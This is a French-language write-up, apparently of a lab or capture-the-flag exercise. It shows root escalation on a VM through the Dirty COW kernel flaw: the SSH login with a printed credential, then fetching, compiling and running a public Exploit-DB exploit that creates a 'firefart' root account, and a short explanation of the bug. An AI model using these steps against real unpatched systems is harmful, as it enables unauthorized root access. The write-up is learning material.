# Dirty COW

On se connecte en ssh à la machine avec les credentials:
```
$ ssh laurie@<IP>
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

# Version KERNEL
On verifie la version du Kernel
```
$ uname -a
```

On se rend compte que la version de Kernel (3.2.0-91) est vulnérable a la faille Dirty COW.

Après quelques recherches sur le net, on tombe sur ce site qui met à disposition un exploit pour Dirty COW.
```
https://www.exploit-db.com/exploits/40839
```

# Exploit
On copie le fichier ```exploit_dirty.c``` dans la VM.
```
$ scp exploit_dirty.c laurie@<IP>:/home/laurie 
```

On compile
```
$ gcc -pthread exploit_dirty.c -o dirty -lcrypt
```

On exécute
```
$ ./dirty <NEW-PASSWORD>
```

On exécute ```su firefart``` avec le mot de passe choisi.

On verifie l'uid
```
$ id
```

On se rend compte que nous sommes uid=0. BINGO!!!

On se deplace dans le dossier ```/root``` et avec un ```cat README``` on se rendre compte que nous sommes root sur la machine!


# Explication de la faille
La faille Dirty COW touche le noyau Linux à partir de la version 2.6.22 (Septembre 2007) jusqu'à la version 4.4.25 inclus. Elle a été corrigé depuis la version 4.4.26.
Elle exploite les fonctionnalités Copy-On-Write (COW) du noyau, d'où son nom. C'est par ce biais que le pirate peut atteindre et écrire sur des espaces memoire qui, normalement, ne sont qu'en lecture seule. 
De cette facon, il est possible de faire une élévation de privilèges et devenir root.

La faille Dirty COW a été découverte par Phil Oester.

```
Video Youtube
Lien: https://www.youtube.com/watch?v=kEsshExn7aE
```
